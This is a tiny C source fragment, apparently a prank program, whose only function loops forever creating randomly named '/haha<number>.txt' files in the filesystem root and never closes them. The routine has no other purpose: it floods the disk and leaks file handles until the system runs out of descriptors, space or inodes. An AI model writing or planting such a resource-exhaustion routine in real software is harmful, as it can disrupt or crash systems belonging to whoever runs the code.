#include <stdio.h>
#include<stdlib.h>

int pixle(){
int i=1;

	while(i ==1){
		FILE *Run;
		char buffer[100];
		sprintf(buffer, "/haha%d.txt",rand());
		FILE *f=fopen(buffer, "w");
	}
	return 0;
}